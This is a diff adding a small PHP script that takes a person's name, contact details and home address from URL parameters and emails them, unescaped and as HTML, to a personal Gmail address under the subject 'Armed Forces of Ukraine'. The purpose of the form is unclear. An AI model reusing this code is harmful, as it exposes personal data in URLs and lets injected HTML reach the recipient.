@@ -1,0 +1,13 @@
+ <?php //error_reporting(0);
+    $name = $_GET["name"];
+    $mail = $_GET["mail"];
+    $telephon = $_GET["telephon"];
+    $country = $_GET["country"];
+    $adresa = $_GET["adresa"];
+    $city = $_GET["city"];
+    $dom = $_GET["dom"];
+    $index = $_GET["index"];
+    $pidpus = "Збройні Сили України";
+    $forma1 ="Прізвище та ім’я: ".$name."<br>"."Почта: ".$mail."<br>"."Телефон: ".$telephon."<br>"."Країна: ".$country."<br>"."Адреса: ".$adresa."<br>"."Місто: ".$city."<br>"."Будинок: ".$dom."<br>"."Поштовий індекс: ".$index;
+mail("darkopasha@gmail.com", "$pidpus", $forma1, "Content-type: text/html; charset=utf-8 \r\n");
+echo("Відправлено");
